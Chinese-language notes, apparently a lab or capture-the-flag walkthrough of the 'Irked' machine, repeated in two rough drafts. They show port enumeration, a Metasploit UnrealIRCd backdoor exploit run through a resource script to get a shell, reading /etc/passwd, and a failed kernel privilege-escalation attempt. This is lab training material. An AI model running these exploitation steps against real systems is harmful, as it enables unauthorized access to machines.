``` Apache/2.4.10 10.10.10.117/manual/images/ ## 22 ssh michael@10.10.10.117 ssh steven@10.10.10.117 ## IRC searchsploit UnrealIRCd 浏览器访问以下地址，6697获得了一条信息：“ERROR :Closing Link: [10.10.14.13] (Throttled: Reconnecting too fast) -Email djmardov@irked.htb for more information.” 10.10.10.117:6697 10.10.10.117:8067 10.10.10.117:65534 search UnrealIRCd use exploit/unix/irc/unreal_ircd_3281_backdoor ![3]($res/3.PNG) 获得一个shell ## 提权 ``` pwd /home/ircd/Unreal3.2 whoami ircd cat /etc/passwd | grep home djmardov:x:1000:1000:djmardov,,,:/home/djmardov:/bin/bash ircd:x:1001:1001::/home/ircd:/bin/sh find . -name "*.txt" ls -al /home/djmardov/Documents/user.txt -rw------- 1 djmardov djmardov 33 May 15 2018 /home/djmardov/Documents/user.txt cd /;find . -name "user.txt" 2>/dev/null ./home/djmardov/Documents/user.txt python -c 'import pty; pty.spawn("/bin/bash")' su djmardov gcc -v gcc version 4.9.2 (Debian 4.9.2-10+deb8u1) uname -a Linux irked 3.16.0-6-686-pae #1 SMP Debian 3.16.56-1+deb8u1 (2018-05-08) i686 GNU/Linux ``` [Linux Kernel 3.0 < 3.3.5](https://www.exploit-db.com/exploits/38390) 尝试提取，失败 ![4]($res/4.PNG)

``` Apache/2.4.10 10.10.10.117/manual/images/ ## 22 ssh michael@10.10.10.117 ssh steven@10.10.10.117 ## IRC searchsploit UnrealIRCd 浏览器访问以下地址，6697获得了一条信息：“ERROR :Closing Link: [10.10.14.13] (Throttled: Reconnecting too fast) -Email djmardov@irked.htb for more information.” 10.10.10.117:6697 10.10.10.117:8067 10.10.10.117:65534 search UnrealIRCd ## irc.rc ![3]($res/3.PNG) ``` use exploit/unix/irc/unreal_ircd_3281_backdoor set RHOST 10.10.10.117 set RPORT 6697 run msfconsole -r irc.rc shell python -c 'import pty; pty.spawn("/bin/bash")' ``` 获得一个shell `find . -name "user.txt" 2>/dev/null` 尝试获得user.txt，权限不够 ## 提权 ``` pwd /home/ircd/Unreal3.2 whoami ircd cat /etc/passwd | grep home djmardov:x:1000:1000:djmardov,,,:/home/djmardov:/bin/bash ircd:x:1001:1001::/home/ircd:/bin/sh find . -name "*.txt" ls -al /home/djmardov/Documents/user.txt -rw------- 1 djmardov djmardov 33 May 15 2018 /home/djmardov/Documents/user.txt cd /;find . -name "user.txt" 2>/dev/null ./home/djmardov/Documents/user.txt python -c 'import pty; pty.spawn("/bin/bash")' su djmardov gcc -v gcc version 4.9.2 (Debian 4.9.2-10+deb8u1) uname -a Linux irked 3.16.0-6-686-pae #1 SMP Debian 3.16.56-1+deb8u1 (2018-05-08) i686 GNU/Linux ``` #### 尝试1 [Linux Kernel 3.0 < 3.3.5](https://www.exploit-db.com/exploits/38390) 提权失败 ![4]($res/4.PNG) use post/multi/recon/local_exploit_suggester 没有发现任何可用exp
